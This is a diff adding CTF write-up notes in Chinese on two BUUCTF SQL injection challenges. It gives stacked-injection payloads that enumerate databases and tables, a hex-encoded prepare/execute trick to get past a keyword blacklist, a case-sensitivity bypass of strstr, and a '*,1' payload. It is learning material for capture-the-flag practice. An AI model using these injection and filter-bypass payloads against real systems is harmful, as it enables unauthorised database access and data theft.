@@ -107,3 +107,29 @@ if($_POST[user] && $_POST[pass]) {
     若前面id为-1，则查询结果中为空，则显示union后面的数据
     payload:id=-1' union select * from (select 1) a join (select 2) b %23
     回显2则可以在2处插入查询语句。后略
+### 7.BUUCTF：[强网杯 2019]随便注
+```php
+return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
+```
+    由于过滤了很多查询语句，不过，可以使用16进制绕过
+    先set @a=0x------ 
+    然后使用prepare将@a设置为sql语句，再使用execute [名字]来执行
+
+    wp:由于select被过滤，所以需要使用堆叠注入
+    1';show databases;# 得到数据库supersqli
+    1';show tables from supersqli; # 得到表1919810931114514
+    1';show column from `1919810931114514`;# 得知只有flag一个字段
+    构造语句select flag from `1919810931114514`将其转为16进制得到73656C65637420666C61672066726F6D20603139313938313039333131313435313460
+    所以最终payload：
+    inject=1';Set @a=0x73656C65637420666C61672066726F6D20603139313938313039333131313435313460;prepare test from @a;execute test;#
+    
+##### 注意：
+    语句需要一次执行，如果分为set和prepare和execute分次发包的话无法执行。不知道为啥= =
+    使用set会显示strstr过滤，但是strstr是严格区分大小写的，Set绕过，stristr为不区分大小写。
+    
+### 8.BUUCTF：[SUCTF 2019]EasySQL
+
+    SQL语句为：select $_POST[query] || flag from flag 完全猜不到
+    ||起到or的作用
+    语句为：select post的数据 or flag from flag;
+    payload：*,1
